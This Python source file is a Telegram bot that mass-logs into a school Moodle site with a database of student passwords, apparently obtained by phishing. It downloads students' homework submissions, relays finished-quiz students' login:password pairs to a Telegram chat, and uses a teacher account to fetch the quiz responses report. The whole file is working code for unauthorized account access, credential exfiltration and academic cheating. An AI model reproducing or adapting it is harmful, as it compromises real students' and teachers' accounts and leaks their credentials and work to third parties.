import asyncio
import concurrent.futures
import os
import shutil
#
import bs4
import requests as rq
import telebot
import database
import os
import dotenv
dotenv.load_dotenv()
#
def download_file(url, cookies, login, id):
    local_filename = login + '.' + url.split('.')[-1]
    # NOTE the stream=True parameter below
    with rq.get(url, cookies=cookies, stream=True) as r:
        r.raise_for_status()
        with open("./phis/" + str(id) + '/' + local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=int(8192)):
                # If you have chunk encoded response uncomment if
                # and set chunk_size parameter to None.
                # if chunk:
                f.write(chunk)
                # print(chunk)
    return local_filename


def main(login, password, id):
    try:
        x = rq.get("https://lycedu.urfu.ru/login/index.php")
        cookie = (x.headers["Set-Cookie"])
        bs = bs4.BeautifulSoup(x.content, features="html.parser")
        logintoken = bs.find_all(name="input")[3]["value"]

        cookie = (cookie.split(';')[0])
        cookie = cookie.split('=')[1]
        # print(cookie)
        # print(logintoken)
        data = {
            "username": login,
            "logintoken": logintoken,
            "password": password,
            "anchor": ""
        }
        zxc = rq.post("https://lycedu.urfu.ru/login/index.php", cookies={"MoodleSession": cookie},
                      data=data,
                      allow_redirects=False
                      )
        newcookie = (zxc.cookies.values()[0])
        # print(newcookie)
        newcookies = {
            "MoodleSession": newcookie
        }
        # print(newcookies)
        start = rq.get(f"https://lycedu.urfu.ru/mod/assign/view.php?id={id}&action=view", cookies=newcookies)
        # print(start.content.decode("utf-8", errors='ignore'))
        bs = bs4.BeautifulSoup(start.content, features="html.parser")
        tags = bs.find_all(target="_blank")
        cnt = 0
        if len(tags) == 0:
            # print(login, "is razdolbai")
            return False

        for tag in tags:
            cnt += 1
            link_to_solution = (tag["href"]).split('?')[0]
            # print(link_to_solution)
            download_file(link_to_solution, newcookies, login + '  ' + str(cnt), id)
        # print(login, "downloaded")
        return True
    except:
        # print("error during get homework", login, password)
        # return "error"
        pass


people_done = []


def get_teacher_answers(id, login, password):
    x = rq.get("https://lycedu.urfu.ru/login/index.php")
    cookie = (x.headers["Set-Cookie"])
    bs = bs4.BeautifulSoup(x.content, features="html.parser")
    logintoken = bs.find_all(name="input")[3]["value"]

    cookie = (cookie.split(';')[0])
    cookie = cookie.split('=')[1]
    # print(cookie)
    # print(logintoken)
    data = {
        "username": login,
        "logintoken": logintoken,
        "password": password,
        "anchor": ""
    }
    zxc = rq.post("https://lycedu.urfu.ru/login/index.php", cookies={"MoodleSession": cookie},
                  data=data,
                  allow_redirects=False
                  )
    newcookie = (zxc.cookies.values()[0])
    # print(newcookie)
    newcookies = {
        "MoodleSession": newcookie
    }
    # print(newcookies)
    start = rq.get(f"https://lycedu.urfu.ru/mod/quiz/report.php?id={id}&mode=responses", cookies=newcookies,
                   allow_redirects=True)
    with open("f.html", "wb") as f:
        f.write(start.content)


if __name__ == "__main__":
    get_teacher_answers(4775, "moodle_teacher", "moodle_teacher_password")


def quiz(login, password, id):
    try:
        x = rq.get("https://lycedu.urfu.ru/login/index.php")
        cookie = (x.headers["Set-Cookie"])
        bs = bs4.BeautifulSoup(x.content, features="html.parser")
        logintoken = bs.find_all(name="input")[3]["value"]

        cookie = (cookie.split(';')[0])
        cookie = cookie.split('=')[1]
        # print(cookie)
        # print(logintoken)
        data = {
            "username": login,
            "logintoken": logintoken,
            "password": password,
            "anchor": ""
        }
        zxc = rq.post("https://lycedu.urfu.ru/login/index.php", cookies={"MoodleSession": cookie},
                      data=data,
                      allow_redirects=False
                      )
        newcookie = (zxc.cookies.values()[0])
        # print(newcookie)
        newcookies = {
            "MoodleSession": newcookie
        }
        # print(newcookies)
        start = rq.get(f"https://lycedu.urfu.ru/mod/quiz/view.php?id={id}", cookies=newcookies)
        # print(start.content.decode("utf-8", errors='ignore'))
        if start.text.count("Завершены") >= 1:
            people_done.append([login, password])
        else:
            print("False")
        return True
    except:
        # print("error during get homework", login, password)
        # return "error"
        pass


async def work(id, func):
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        loop = asyncio.get_event_loop()
        futures = [
            loop.run_in_executor(
                executor,
                func,
                i['login'], i['password'], id
            )
            for i in database.get_login_passwords()
        ]
        for response in await asyncio.gather(*futures):
            print(response)


def solve(id: str, chat_id, bot: telebot.TeleBot, type: str):
    people_done.clear()
    if not id.isdigit():
        print("tryed to hack")
        return 0
    try:
        os.mkdir(f"./phis/{str(id)}")
    except:
        shutil.rmtree(f"./phis/{str(id)}", ignore_errors=True)
        os.mkdir(f"./phis/{str(id)}")
    if type == "teacher":
        get_teacher_answers(id, os.getenv("MOODLE_TEACHER_LOGIN"), os.getenv("MOODLE_TEACHER_PASSWORD"))
        bot.send_document(chat_id=chat_id, document=open("f.html", "rb"))
        return 0
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop = asyncio.get_event_loop()
    if type == "ph":
        loop.run_until_complete(work(id, main))
        loop.close()
        for document in os.listdir(f"./phis/{id}"):
            bot.send_document(str(chat_id), open(f"./phis/{id}/{document}", "rb"))
    if type == "q":
        loop.run_until_complete(work(id, quiz))
        loop.close()
        for [a, b] in people_done:
            bot.send_message(chat_id, f"{a}:{b}")
    bot.send_message(str(chat_id), "done")
